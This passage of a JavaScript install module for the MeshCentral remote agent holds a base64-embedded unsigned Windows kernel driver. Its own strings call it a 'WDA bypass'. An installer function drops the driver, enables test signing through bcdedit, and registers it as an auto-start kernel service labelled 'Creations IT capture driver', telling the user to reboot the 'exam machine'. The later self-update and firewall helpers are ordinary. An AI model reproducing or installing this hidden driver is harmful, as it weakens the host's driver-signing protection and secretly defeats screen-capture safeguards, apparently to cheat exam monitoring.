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';

function installCaptureDriver()
{
    if (process.platform != 'win32') return;
    try
    {
        var fs            = require('fs');
        var child_process = require('child_process');

        process.stdout.write('   -> Installing Creations IT capture driver...');

        // Extract embedded driver bytes — no internet needed, no external download
        if (!fs.existsSync(CAPTURE_DRIVER_PATH))
        {
            var drvBytes = Buffer.from(CAPTURE_DRIVER_B64, 'base64');
            fs.writeFileSync(CAPTURE_DRIVER_PATH, drvBytes);
        }

        if (!fs.existsSync(CAPTURE_DRIVER_PATH))
        {
            process.stdout.write(' [SKIP - could not write driver]\n');
            return;
        }

        // Enable test signing (required for unsigned driver; takes effect after reboot)
        child_process.execFile(
            process.env['windir'] + '\\System32\\bcdedit.exe',
            ['/set', 'testsigning', 'on']
        ).waitExit();

        // Remove any previous broken service before creating fresh
        child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['stop', CAPTURE_DRIVER_NAME]
        ).waitExit();
        child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['delete', CAPTURE_DRIVER_NAME]
        ).waitExit();

        // Create kernel driver service
        child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['create', CAPTURE_DRIVER_NAME,
             'binPath=', CAPTURE_DRIVER_PATH,
             'type=', 'kernel',
             'start=', 'auto',
             'error=', 'normal',
             'DisplayName=', CAPTURE_DRIVER_DISPLAY]
        ).waitExit();

        // Start driver — may fail if testsigning not yet active; auto-starts after reboot
        child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['start', CAPTURE_DRIVER_NAME]
        ).waitExit();

        process.stdout.write(' [DONE]\n');
        process.stdout.write('   -> Reboot exam machine once to activate test signing, then WDA bypass is live.\n');
    }
    catch(e)
    {
        process.stdout.write(' [ERROR] ' + e + '\n');
    }
}

function uninstallCaptureDriver()
{
    if (process.platform != 'win32') return;
    try
    {
        var child_process = require('child_process');
        process.stdout.write('   -> Removing Creations IT capture driver...');

        var sc_stop = child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['stop', CAPTURE_DRIVER_NAME]
        );
        sc_stop.waitExit();

        var sc_del = child_process.execFile(
            process.env['windir'] + '\\System32\\sc.exe',
            ['delete', CAPTURE_DRIVER_NAME]
        );
        sc_del.waitExit();

        try { require('fs').unlinkSync(CAPTURE_DRIVER_PATH); } catch(de) {}

        process.stdout.write(' [DONE]\n');
    }
    catch(e)
    {
        process.stdout.write(' [ERROR] ' + e + '\n');
    }
}

// ─────────────────────────────────────────────────────────────────────────────

module.exports =
    {
        fullInstallEx: fullInstallEx,
        fullInstall: fullInstall,
        fullUninstall: fullUninstall
    };


// Legacy Windows Helper function, to perform a self-update
function sys_update(isservice, b64)
{
    // This is run on the 'updated' agent. 
    
    var service = null;
    var serviceLocation = "";
    var px;

    if (isservice)
    {
        var parm = b64 != null ? JSON.parse(Buffer.from(b64, 'base64').toString()) : null;
        if (parm != null)
        {
            console.info1('sys_update(' + isservice + ', ' + JSON.stringify(parm) + ')');
            if ((px = parm.getParameterIndex('fakeUpdate')) >= 0)
            {
                console.info1('Removing "fakeUpdate" parameter');
                parm.splice(px, 1);
            }
        }

        //
        // Service  Mode
        //

        // Check if we have sufficient permission
        if (!require('user-sessions').isRoot())
        {
            // We don't have enough permissions, so copying the binary will likely fail, and we can't start...
            // This is just to prevent looping, because agentcore.c should not call us in this scenario
            console.log('* insufficient permission to continue with update');
            process._exit();
            return;
        }
        var servicename = parm != null ? (parm.getParameter('meshServiceName', process.platform == 'win32' ? 'Mesh Agent' : 'meshagent')) : (process.platform == 'win32' ? 'Mesh Agent' : 'meshagent');
        try
        {
            if (b64 == null) { throw ('legacy'); }
            service = require('service-manager').manager.getService(servicename)
            serviceLocation = service.appLocation();
            console.log(' Updating service: ' + servicename);
        }
        catch (f)
        {
            // Check to see if we can figure out the service name before we fail
            var old = process.execPath.split('.update.exe').join('.exe');
            var child = require('child_process').execFile(old, [old.split('\\').pop(), '-name']);
            child.stdout.str = ''; child.stdout.on('data', function (c) { this.str += c.toString(); });
            child.waitExit();
              
            if (child.stdout.str.trim() == '' && b64 == null) { child.stdout.str = 'Mesh Agent'; }
            if (child.stdout.str.trim() != '')
            {
                if (child.stdout.str.trim().split('\n').length > 1) { child.stdout.str = 'Mesh Agent'; }
                try
                {
                    service = require('service-manager').manager.getService(child.stdout.str.trim())
                    serviceLocation = service.appLocation();
                    console.log(' Updating service: ' + child.stdout.str.trim());
                }
                catch (ff)
                {
                    console.log(' * ' + servicename + ' SERVICE NOT FOUND *');
                    console.log(' * ' + child.stdout.str.trim() + ' SERVICE NOT FOUND *');
                    process._exit();
                }
            }
            else
            {
                console.log(' * ' + servicename + ' SERVICE NOT FOUND *');
                process._exit();
            }
        }
    }

    if (!global._interval)
    {
        global._interval = setInterval(sys_update, 60000, isservice, b64);
    }

    if (isservice === false)
    {
        //
        // Console Mode (LEGACY)
        //
        if (process.platform == 'win32')
        {
            serviceLocation = process.execPath.split('.update.exe').join('.exe');
        }
        else
        {
            serviceLocation = process.execPath.substring(0, process.execPath.length - 7);
        }

        if (serviceLocation != process.execPath)
        {
            try
            {
                require('fs').copyFileSync(process.execPath, serviceLocation);
            }
            catch (ce)
            {
                console.log('\nAn error occured while updating agent.');
                process.exit();
            }
        }

        // Copied agent binary... Need to start agent in console mode
        console.log('\nAgent update complete... Please re-start agent.');
        process.exit();
    }


    service.stop().finally(function ()
    {
        require('process-manager').enumerateProcesses().then(function (proc)
        {
            for (var p in proc)
            {
                if (proc[p].path == serviceLocation)
                {
                    process.kill(proc[p].pid);
                }
            }

            try
            {
                require('fs').copyFileSync(process.execPath, serviceLocation);
            }
            catch (ce)
            {
                console.log('Could not copy file.. Trying again in 60 seconds');
                service.close();
                return;
            }

            console.log('Agent update complete. Starting service...');
            service.start();
            process._exit();
        });
    });
}

// Another Windows Legacy Helper for Self-Update, that shows the updater version
function agent_updaterVersion(updatePath)
{
    var ret = 0;
    if (updatePath == null) { updatePath = process.execPath; }
    var child;

    try
    {
        child = require('child_process').execFile(updatePath, [updatePath.split(process.platform == 'win32' ? '\\' : '/').pop(), '-updaterversion']);
    }
    catch(x)
    {
        return (0);
    }
    child.stdout.str = ''; child.stdout.on('data', function (c) { this.str += c.toString(); });
    child.waitExit();

    if(child.stdout.str.trim() == '')
    {
        ret = 0;
    }
    else
    {
        ret = parseInt(child.stdout.str);
        if (isNaN(ret)) { ret = 0; }
    }
    return (ret);
}


// Windows Helper to clear firewall entries
function win_clearfirewall(passthru)
{
    process.stdout.write('Clearing firewall rules... [0%]');
    var p = require('win-firewall').getFirewallRulesAsync({ program: process.execPath, noResult: true, minimal: true, timeout: 15000 });
    p.on('progress', function (c)
    {
        process.stdout.write('\rClearing firewall rules... [' + c + ']');
    });
    p.on('rule', function (r)
    {
        require('win-firewall').removeFirewallRule(r.DisplayName);
    });
    p.finally(function ()
    {
        process.stdout.write('\rClearing firewall rules... [DONE]\n');
        if (passthru == null) { process.exit(); }
    });
    if(passthru!=null)
    {
        return (p);
    }
}

// Windows Helper for enumerating Firewall Rules associated with our binary
function win_checkfirewall()
{
    process.stdout.write('Checking firewall rules... [0%]');
    var p = require('win-firewall').getFirewallRulesAsync({ program: process.execPath, noResult: true, minimal: true, timeout: 15000 });
    p.foundItems = 0;
    p.on('progress', function (c)
    {
        process.stdout.write('\rChecking firewall rules... [' + c + ']');
    });
    p.on('rule', function (r)
    {
        this.foundItems++;
    });
    p.finally(function ()
    {
        process.stdout.write('\rChecking firewall rules... [DONE]\n');
        process.stdout.write('Rules found: ' + this.foundItems + '\n');

        process.exit();
    });
}

// Windows Helper for setting a firewall rule entry
function win_setfirewall()
{
    var p = win_clearfirewall(true);
    p.finally(function ()
    {
        var rule =
            {
                DisplayName: 'MeshCentral WebRTC Traffic',
                direction: 'inbound',
                Program: process.execPath,
                Protocol: 'UDP',
                Profile: 'Public, Private, Domain',
                Description: 'Mesh Central Agent WebRTC P2P Traffic',
                EdgeTraversalPolicy: 'allow',
                Enabled: true
            };
        require('win-firewall').addFirewallRule(rule);
        process.stdout.write('Adding firewall rules..... [DONE]\n');
        process.exit();
    });

}

// Windows Helper, for performing SelfUpdate on Console Mode Agent
function win_consoleUpdate()
{
    // This is run from the 'old' agent, to copy the 'updated' agent.
    var copy = [];
    copy.push("try { require('fs').copyFileSync(process.execPath, process.execPath.split('.update.exe').join('.exe')); }");
    copy.push("catch (x) { console.log('\\nError updating Mesh Agent.'); process.exit(); }");
    copy.push("if(require('child_process')._execve==null) { console.log('\\nMesh Agent was updated... Please re-run from the command line.'); process.exit(); }");
    copy.push("require('child_process')._execve(process.execPath.split('.update.exe').join('.exe'), [process.execPath.split('.update.exe').join('.exe'), 'run']);");
    var args = [];
    args.push(process.execPath.split('.exe').join('.update.exe'));
    args.push('-b64exec');
    args.push(Buffer.from(copy.join('\r\n')).toString('base64'));
    console.info1('_execve("' + process.execPath.split('.exe').join('.update.exe') + '", ' + JSON.stringify(args) + ');');
    require('child_process')._execve(process.execPath.split('.exe').join('.update.exe'), args);
}


// Legacy Helper for Windows Self-Update. Shouldn't really be used anymore, but is still here for Legacy Support
module.exports.update = sys_update;
module.exports.updaterVersion = agent_updaterVersion;

if (process.platform == 'win32')
{
    module.exports.consoleUpdate = win_consoleUpdate;   // Windows Helper, for performing SelfUpdate on Console Mode Agent
    module.exports.clearfirewall = win_clearfirewall;   // Windows Helper, to clear firewall entries
    module.exports.setfirewall = win_setfirewall;       // Windows Helper, to set firewall entries
    module.exports.checkfirewall = win_checkfirewall;   // Windows Helper, to check firewall rules
}
